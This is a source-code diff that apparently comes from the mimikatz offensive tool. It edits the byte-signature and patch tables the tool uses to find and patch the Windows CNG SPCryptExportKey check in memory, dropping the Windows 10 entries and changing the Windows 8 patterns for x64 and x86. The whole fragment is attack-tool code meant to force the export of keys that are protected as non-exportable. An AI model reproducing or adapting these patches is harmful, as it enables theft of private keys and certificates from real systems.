@@ -692,23 +692,19 @@ BYTE PATC_WALL_SPCryptExportKey_EXPORT[]	= {0xeb};
 #ifdef _M_X64
 BYTE PTRN_WI60_SPCryptExportKey[]			= {0xf6, 0x43, 0x28, 0x02, 0x0f, 0x85};
 BYTE PTRN_WNO8_SPCryptExportKey[]			= {0xf6, 0x43, 0x28, 0x02, 0x75};
-BYTE PTRN_WIN8_SPCryptExportKey[]			= {0xf6, 0x43, 0x24, 0x02, 0x75};
-BYTE PTRN_WN10b_SPCryptExportKey[]			= {0xf6, 0x46, 0x24, 0x02, 0x75};
+BYTE PTRN_WIN8_SPCryptExportKey[]			= {0xf6, 0x46, 0x24, 0x02, 0x75};
 BYTE PATC_WI60_SPCryptExportKey_EXPORT[]	= {0x90, 0xe9};
 KULL_M_PATCH_GENERIC CngReferences[] = {
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WI60_SPCryptExportKey),	PTRN_WI60_SPCryptExportKey},	{sizeof(PATC_WI60_SPCryptExportKey_EXPORT), PATC_WI60_SPCryptExportKey_EXPORT}, {4}},
 	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WNO8_SPCryptExportKey),	PTRN_WNO8_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_SPCryptExportKey),	PTRN_WIN8_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
-	{KULL_M_WIN_BUILD_10b,		{sizeof(PTRN_WN10b_SPCryptExportKey),	PTRN_WN10b_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
 };
 #elif defined _M_IX86
 BYTE PTRN_WNO8_SPCryptExportKey[]			= {0xf6, 0x41, 0x20, 0x02, 0x75};
-BYTE PTRN_WIN8_SPCryptExportKey[]			= {0xf6, 0x47, 0x1c, 0x02, 0x75};
-BYTE PTRN_WI10_SPCryptExportKey[]			= {0xf6, 0x43, 0x1c, 0x02, 0x75};
+BYTE PTRN_WIN8_SPCryptExportKey[]			= {0xf6, 0x43, 0x1c, 0x02, 0x75};
 KULL_M_PATCH_GENERIC CngReferences[] = {
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_SPCryptExportKey),	PTRN_WNO8_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_SPCryptExportKey),	PTRN_WIN8_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
-	{KULL_M_WIN_BUILD_10,		{sizeof(PTRN_WI10_SPCryptExportKey),	PTRN_WI10_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
 };
 #endif
 NTSTATUS kuhl_m_crypto_p_cng(int argc, wchar_t * argv[])
